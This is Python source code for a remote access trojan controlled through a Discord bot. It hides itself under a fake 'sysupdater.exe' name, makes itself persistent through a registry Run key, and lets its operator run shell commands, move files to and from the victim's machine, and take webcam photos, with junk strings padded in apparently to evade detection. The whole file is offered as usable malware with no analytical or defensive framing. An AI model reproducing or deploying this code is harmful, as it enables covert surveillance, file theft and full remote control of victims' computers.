from discord.ext import commands
import subprocess
import discord
import os 
import sys
import platform
import cv2
from datetime import datetime
import shutil

channel_id = "22321232"
username = os.getlogin()

def dossssssss():
    vsasdr = "sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssebfwjehbfwkjebfwkjbfwjkbwkjbfwejwejkbfwkjwfkebfkwjebfwejkbfwejkbfwekjbfwejkbfkwebfwekjdddddddddddddddddddddddddddddddddddddddddddddddddddddaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
   
try:
    file_path = os.environ['appdata']+"\Programs\sysupdater.exe"
except:
    pass
if not os.path.exists(file_path) and platform.system == "Windows":
    try:
        os.mkdir(f"{os.environ['appdata']}\Programs")
    except:
        pass
        
    try:
        shutil.copyfile(sys.executable,file_path)
        os.system(f"attrib +h +s {os.environ['appdata']}\Programs")
        subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+file_path+'"',shell=True)
    except Exception as e:
        print(e)
        
    

    
def do_nothinsg_personal():
    var = "sjdhfsjhfwkjehiwjhfbkwjenkwjewkfebfwjehbfwkjebfwkjbfwjkbwkjbfwejwejkbfwkjwfkebfkwjebfwejkbfwejkbfwekjbfwejkbfkwebfwekjdddddddddddddddddddddddddddddddddddddddddddddddddddddaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    
def exec_command(input):
    input = input.split(" ")
    if input[0] == "cd":
        try:
            os.chdir(input[1])
            return "done"
        except:
            return "failed"
    output = subprocess.Popen(input,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    output_bytes = output.stdout.read() + output.stderr.read() 
    output_str = str(output_bytes,'utf-8')
    return output_str

def camshot():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return "Error: Could not open camera."
    ret, frame = cap.read()
    cap.release()
    current_datetime = datetime.now()
    formatted_datetime = current_datetime.strftime("%Y-%m-%d %H:%M:%S")
    if not ret:
        return "Error: Could not capture photo."
    if not os.path.exists(f"{os.getcwd}/.files"):
        try:
            os.mkdir(f"{os.getcwd()}/.files")
        except:
            pass
    try:
        path = f"{os.getcwd()}/.files/{formatted_datetime}.jpg"
        cv2.imwrite(path, frame)
        return path
    except Exception as e:
        return "Error in capturing"
    
    

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    channel = bot.get_channel(channel_id)
    await channel.send(f"{username} is online")

@bot.command()
async def session(ctx):
    await ctx.send(f"[ ] {username}")

@bot.command(name=f"shell.{username}")
async def shell(ctx, *args):
    var = "sjdhfsjhfwkjehiwjhfbkwjenkwjewkfebfwjehbfwkjebfwkjbfwjkbwkjbfwejwejkbfwkjwfkebfkwjebfwejkbfssssssssssssssssssssssssssssssssssssssssssssssssssss"
    try:
        arguments = ' '.join(args)
        stream = os.popen(arguments)
        output = stream.read()
    except:
        output = "Error in execution"
    if sys.getsizeof(output) > 2000:
        await ctx.send(f"``[+] {username}: Command executed``")
    else:
        await ctx.send(f"``[+] {username}: Command executed`` ```sh\n{output}```")

@bot.command(name=f"savefile.{username}")
async def savefile(ctx,msgid):
    var = "sjdhfsjhfwkjehiwjhfbkwjenkwjewkfebfwjehbfwkjebfwkjbfwjkbwkjbfwejwejkbfwkjwfkebfkwjebfwejkbfsqwdewedfwedwefwefwefwedwfefwerfer"
    msg = await ctx.fetch_message(msgid)
    if os.path.exists(f"{os.getcwd()}/.files"):
        pass
    else:
        os.mkdir(f"{os.getcwd()}/.files")
    try:
        for attachment in msg.attachments:
            url = attachment.url
            await attachment.save(f'{os.getcwd()}/.files/{attachment.filename}')
            await ctx.send(f"File '{attachment.filename}' downloaded successfully!")
    except Exception as e:
        await ctx.send(f"Error in downloading file")

@bot.command(name=f"getfile.{username}")
async def getfile(ctx,msg):
    var = "sjdhfsjhfwkjehiwjhfbkwjenkwjewkfebfwjehbfwkjebfwkjbfwjkbwkjbfwejwejkbfwkjwfkebfkwjebfwejkbfssssssssssssssssqqqqqqqqqqqqqqqqqqqqeeeeeeeeeee"
    try:
        file = discord.File(msg)
        await ctx.send(file=file)
    except:
        await ctx.send(f"Something is wrong")


@bot.command(name=f"camsnap.{username}")
async def camsnap(ctx):
    var = "sjdhfsjhfwkjehiwjhfbkwjenkwjewkfebfwjehbfwkjebfwkjbfwjkbwkjbfwejwejkbfwkjwfkebfkwjebfwejkbfssssssssssssssssssssssssssssssssssssssssssssssssssssssswqqqqqqqqq"
    path = camshot()
    if path.endswith("jpg"):
        file = discord.File(path)
        await ctx.send(file=file)
    else:
        await ctx.send("Error in taking snap")

def do_nothissssssssssssssssssssssssssssssssssnsg_personal():
    var = "sjdhsawqededwefdwefwfwefwdfrewefdfvewdsfvewdsfewfsjhfwkjehiwjhfbkwjenkwjewkfebfwjehbfwkjebfwkjbfwjkbwkjbfwejwejkbfwkjwfkebfkwjebfwejkbfwejkbfwekjbfwejkbfkwebfwekjdddddddddddddddddddddddddddddddddddddddddddddddddddddaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
   
bot.run('Your Bot Token',log_handler=None)
